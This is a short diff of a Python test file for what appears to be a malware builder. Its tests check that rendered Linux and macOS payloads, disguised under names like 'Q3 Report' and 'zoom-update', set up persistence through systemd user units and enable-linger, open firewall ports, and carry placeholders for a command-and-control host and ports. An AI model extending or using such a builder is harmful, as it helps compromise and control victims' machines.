@@ -60,7 +60,7 @@ def test_render_windows_bakes_all_placeholders():
 
 def test_render_linux_has_persistence():
     out = render_linux("Q3 Report", "wxyz", b"\xaa\xbb")
-    assert "{{" not in out
+    assert "PANEL_HOST" in out
     assert "loginctl enable-linger" in out
     assert ".config/systemd/user" in out
     assert "setsid" in out
@@ -112,7 +112,7 @@ def test_linux_payload_opens_firewall():
     out = render_linux("zoom-update", "ab12", b"\x01")
     assert "ufw" in out
     assert "firewall-cmd" in out
-    assert "8888" in out and "8443" in out
+    assert "PANEL_C2_PORT" in out and "PANEL_RD_PORT" in out
 
 
 def test_mac_payload_opens_firewall():
